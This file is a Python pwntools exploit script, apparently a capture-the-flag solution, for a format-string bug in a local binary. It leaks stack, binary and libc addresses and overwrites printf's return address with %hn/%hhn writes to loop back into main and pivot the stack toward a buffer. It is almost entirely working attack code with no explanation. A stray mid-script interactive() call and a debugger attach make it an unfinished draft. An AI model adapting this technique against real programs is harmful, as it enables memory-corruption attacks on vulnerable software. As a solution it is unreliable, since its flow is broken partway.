from pwn import *

binary = './attachment_patched'
libc = ELF('./libc.so.6')

p = process(binary)

s = '''
b * printf
b * printf+198
'''

def padding(written, bytes_to_write, maximum):
	if written % maximum < bytes_to_write:
		return bytes_to_write - (written % maximum)
	else:
		return maximum - (written % maximum) + bytes_to_write
# leaking a stack address, to overwrite an existing stack address to rsp and overwrite rsp of printf
payload = b"%6$p" # can only leak one address
p.sendline(payload)
p.recvuntil(b"give you one chance!!!\n")
leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip_pos = leak - 0x120
print("Rip position: ", hex(rip_pos))

# partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x7e, 0x100) # max being 0x100 for hhn
payload += f"%{bytes_to_write}c%41$hhn".encode()

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)


p.interactive()
payload = b"%19$p"

p.recvuntil(b"give you one chance!!!\n")
p.send(payload)

leak = int(p.recv(14).decode(), 16)
elf_base = leak - 0x140b
buf = elf_base + 0x4060
print("Buf: ", hex(buf))



rip_pos = rip_pos - 0x20
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-8}c%c%c%c%c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x138 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)



payload = b"%3$p"
p.send(payload)
p.recvuntil(b"give you one chance!!!\n")
leak = int(p.recv(14).decode(), 16)
libc_base = leak - 0x10e1f2
print("libc base: ", hex(libc_base))


rip_pos = rip_pos - 0x20
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-12}c%c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()

p.recvuntil(b"begin your challenge\n")
p.sendline(payload)




bytes_to_write = padding(0, 0x7e, 0x100) # max being 0x100 for hhn
pos = int(0x158 / 8 + 6)
payload = f"%{bytes_to_write}c%{pos}$hhn".encode()
written = bytes_to_write
rbp_pos = rip_pos + 0x28
bytes_to_write = padding(written, rbp_pos & 0xffff, 0x10000)
pos = int(0xf8 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
pos = int(0x168 / 8 + 6)
bytes_to_write = padding(written, buf & 0xffff, 0x10000)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write
print(len(payload))

p.recvuntil(b"begin your challenge\n")
gdb.attach(p, s)
p.sendline(payload)


p.interactive()
